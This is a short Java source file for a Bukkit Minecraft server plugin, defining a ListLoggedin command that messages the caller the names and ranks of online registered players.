package net.milkbowl.vault.commands.cmds;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

import net.milkbowl.vault.Core;
import net.milkbowl.vault.commands.CommandManager;
import net.milkbowl.vault.util.Settings;

public class ListLoggedin extends CommandManager {
	
	public void execute(Core plugin, String msg, String[] args, Player p) {
		for (Player a : Bukkit.getOnlinePlayers()) {
			if (plugin.registered.contains(a.getName())) {
				p.sendMessage(Settings.PREFIX(a.getName() + " | " + plugin.rank.get(a)));
			}
		}
	}

}
